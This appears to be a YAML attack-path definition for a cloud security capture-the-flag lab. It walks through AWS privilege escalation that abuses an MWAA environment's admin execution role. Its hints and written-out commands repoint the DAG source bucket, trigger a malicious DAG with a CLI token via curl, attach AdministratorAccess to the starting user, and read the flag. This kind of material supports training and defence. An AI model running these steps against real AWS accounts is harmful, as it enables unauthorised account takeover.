attackMap:
  nodes:
    - id: starting-principal
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-mwaa-002-to-admin-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has airflow:UpdateEnvironment and airflow:CreateCliToken permissions
        on an existing MWAA environment that has an administrative execution role attached.

    - id: mwaa-environment
      label: "MWAA Environment"
      type: resource
      subType: mwaa-environment
      arn: "arn:aws:airflow:{region}:{account_id}:environment/pl-prod-mwaa-002-to-admin-env"
      description: >
        An existing Amazon Managed Workflows for Apache Airflow (MWAA) environment
        with an administrative execution role attached. By updating its DAG source
        bucket to an attacker-controlled bucket, malicious DAGs can be introduced
        that execute with the execution role's credentials.

    - id: target-role
      label: "Admin Execution Role"
      type: principal
      subType: iam-role
      isAdmin: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-mwaa-002-to-admin-admin-role"
      description: >
        The IAM execution role attached to the MWAA environment. It has AdministratorAccess,
        meaning any DAG running in the environment can perform any AWS operation, including
        attaching AdministratorAccess to the starting user. With the malicious DAG executing
        as this role, the attacker gains the ability to use admin credentials to read the
        scenario flag from SSM Parameter Store.

    - id: ctf-flag
      label: "CTF Flag"
      type: resource
      subType: ssm-parameter
      isTarget: true
      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/mwaa-002-to-admin"
      description: >
        The CTF flag for this scenario, stored as an SSM parameter in the victim account.
        Retrieving it requires administrator-equivalent permissions (ssm:GetParameter is
        granted implicitly by AdministratorAccess). After the malicious DAG attaches
        AdministratorAccess to the starting user, use those elevated credentials to read
        this parameter and complete the challenge.

  edges:
    - from: starting-principal
      to: mwaa-environment
      label: "airflow:UpdateEnvironment"
      description: >
        Update the MWAA environment's SourceBucketArn to point to an attacker-controlled
        S3 bucket containing a malicious DAG. Wait 10-30 minutes for the environment update
        to complete, then 60 seconds for DAG synchronization.
      hints:
        - "Use airflow:GetEnvironment to inspect the target environment -- note the ExecutionRoleArn and the current SourceBucketArn."
        - "You can change where MWAA looks for DAG files by updating the environment's source bucket configuration."
        - "You need an S3 bucket that the execution role can read from. Its resource policy must allow the MWAA execution role to read objects."
        - "Use airflow:UpdateEnvironment to change SourceBucketArn and DagS3Path to point to your attacker-controlled bucket."
        - "After calling UpdateEnvironment, poll airflow:GetEnvironment until Status returns to AVAILABLE -- this takes 10-30 minutes."
        - "Once the environment is AVAILABLE, wait an additional 60 seconds for MWAA to discover and parse DAGs from the new bucket location."
        - "Browse to https://pathfinding.cloud/paths/mwaa-002 for full technique details."
      commands:
        - description: "Inspect the MWAA environment to confirm its execution role and current DAG source"
          command: "aws mwaa get-environment --name pl-prod-mwaa-002-to-admin-env --query 'Environment.{Status:Status,ExecutionRoleArn:ExecutionRoleArn,SourceBucketArn:SourceBucketArn,DagS3Path:DagS3Path}'"
        - description: "Update the MWAA environment to use the attacker's bucket"
          command: "aws mwaa update-environment --name pl-prod-mwaa-002-to-admin-env --source-bucket-arn arn:aws:s3:::pl-mwaa-002-attacker-bucket-{account_id}-{suffix} --dag-s3-path dags/"
        - description: "Poll until the environment returns to AVAILABLE state"
          command: "aws mwaa get-environment --name pl-prod-mwaa-002-to-admin-env --query 'Environment.Status' --output text"

    - from: mwaa-environment
      to: target-role
      label: "DAG execution with admin role"
      description: >
        The malicious DAG executes within the MWAA environment using the admin execution
        role's credentials, attaching AdministratorAccess to the starting user.
      hints:
        - "Once the environment is updated, use airflow:CreateCliToken to obtain a short-lived token for the Airflow web server API."
        - "The Airflow CLI API endpoint is https://{webserver-hostname}/aws_mwaa/cli -- use the CLI token as a Bearer token to trigger DAGs."
        - "Trigger the malicious DAG using the dags trigger command via the Airflow CLI API. The DAG will execute as the admin execution role."
        - "After triggering the DAG, wait ~30 seconds for execution to complete and for IAM policy changes to propagate."
        - "Use iam:ListAttachedUserPolicies on the starting user to verify that AdministratorAccess has been attached."
      commands:
        - description: "Obtain a CLI token to access the Airflow API"
          command: "aws mwaa create-cli-token --name pl-prod-mwaa-002-to-admin-env"
        - description: "Trigger the malicious DAG via the Airflow CLI API"
          command: "curl -X POST 'https://{webserver-hostname}/aws_mwaa/cli' -H 'Authorization: Bearer {cli_token}' -H 'Content-Type: text/plain' -d 'dags trigger privesc_dag' | base64 -d"
        - description: "Verify that AdministratorAccess was attached to the starting user"
          command: "aws iam list-attached-user-policies --user-name pl-prod-mwaa-002-to-admin-starting-user --query 'AttachedPolicies[*].PolicyArn' --output text"

    - from: target-role
      to: ctf-flag
      label: "ssm:GetParameter"
      description: >
        After the malicious DAG attaches AdministratorAccess to the starting user, switch
        back to those elevated starting-user credentials and retrieve the scenario flag from
        SSM Parameter Store. AdministratorAccess grants ssm:GetParameter on all parameters
        in the account, so no additional permissions are needed.
      hints:
        - "The malicious DAG attached AdministratorAccess to your starting user. Switch back to your starting-user credentials -- they now have admin access."
        - "Scenario flags live under a shared prefix in SSM Parameter Store -- consider what a reasonable naming convention for this lab might look like."
        - "Use ssm:GetParameter with the full parameter name to retrieve the flag value."
      commands:
        - description: "Retrieve the CTF flag from SSM Parameter Store using the now-elevated starting user credentials"
          command: "aws ssm get-parameter --name /pathfinding-labs/flags/mwaa-002-to-admin --query 'Parameter.Value' --output text"
